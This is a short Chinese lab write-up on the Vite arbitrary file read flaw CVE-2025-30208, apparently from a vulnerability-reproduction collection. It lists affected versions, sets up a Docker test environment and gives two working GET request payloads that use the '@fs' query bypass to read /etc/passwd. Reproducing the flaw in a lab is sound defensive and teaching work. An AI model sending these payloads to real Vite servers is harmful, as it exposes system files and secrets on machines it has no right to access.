# Vite任意文件读取漏洞（CVE-2025-30208）


Vite 是一家前端开发工具提供商，在 6.2.3、6.1.2、6.0.12、5.4.15 和 4.5.10 之前的版本中存在漏洞。`@fs` 会拒绝访问 Vite 服务允许列表之外的文件。在 URL 中添加 `?raw??` 或 `?import&raw??` 可绕过此限制并返回文件内容（如果存在）。之所以存在这种绕过漏洞，是因为在多个位置删除了诸如 `?` 之类的尾部分隔符，但在查询字符串正则表达式中并未考虑这些分隔符。任意文件的内容都可以返回到浏览器。只有明确将 Vite 开发服务器暴露给网络（使用 `--host` 或 `server.host` 配置选项）的应用程序才会受到影响。6.2.3、6.1.2、6.0.12、5.4.15 和 4.5.10 版本已修复此问题。

漏洞影响版本
 6.2.0 >= Vite <=6.2.2
 6.1.0 >= Vite <=6.1.1 
 6.0.0 >= Vite <=6.0.11
 5.0.0 >= Vite <=5.4.14
                Vite <=4.5.9

项目地址
	https://github.com/vitejs/vite

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2025-30208

## 环境搭建

执行如下命令启动前端项目vite-v5-4-5-web

```
docker compose up
```

环境启动后，访问`http://your-ip:5173`，404 http响应正常 ，服务器环境已经搭好

## 漏洞复现

GET /@fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1
GET /@fs/etc/passwd?import&raw? HTTP/1.1

![image-20250420113920898](.\1.png)
